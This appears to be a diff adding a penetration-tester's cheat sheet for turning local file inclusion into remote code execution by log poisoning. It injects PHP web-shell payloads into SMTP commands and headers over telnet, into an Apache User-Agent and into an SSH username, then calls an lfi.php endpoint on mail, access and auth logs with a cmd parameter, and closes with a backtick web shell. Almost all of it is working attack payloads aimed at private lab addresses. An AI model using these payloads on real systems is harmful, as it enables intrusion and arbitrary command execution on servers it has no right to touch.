@@ -1,0 +1,44 @@
+#SMTP
+#Injection to be tried in MAIL FROM, RCPT TO, Subject, Date, To, Cc, Date
+telnet 192.168.184.128 25
+
+#if recipient local try root
+
+MAIL FROM: "home <?php system($_GET['cmd']); ?>" 
+RCPT TO: "home <root@localhost>"
+or
+RCPT TO:<?php echo shell_exec($_GET['cmd']);?>
+data
+subject: <?php echo shell_exec($_GET['cmd']);?>
+
+
+HELO relay.example.com
+MAIL FROM: " home <?php system($_GET['cmd']); ?>"
+RCPT TO: "home <?php system($_GET['cmd']); ?>" 
+DATA
+From: "Bob Example <bob@example.com>"
+To: Alice Example <alice@example.com>
+Cc: theboss@example.com
+Date: Tue, 15 Jan 2008 16:02:43 -0500
+Subject: Test message
+
+Hello Alice.
+This is a test message with 5 header fields and 4 lines in the message body.
+Your friend,
+Bob
+.
+QUIT
+
+192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&cmd=ifconfig
+
+#Apache 
+Replace user agent by <?php system($_GET['cmd']); ?>
+192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log&cmd=ifconfig
+
+#SSH 
+ssh '<?php system($_GET['cmd']); ?>'@192.168.1.129
+192.168.1.129/lfi/lfi.php?file=/var/log/auth.log&cmd=ifconfig
+
+
+#Bypassing
+echo '<?php $cmd=$_GET['cmd']; echo `$cmd`; ?>' 
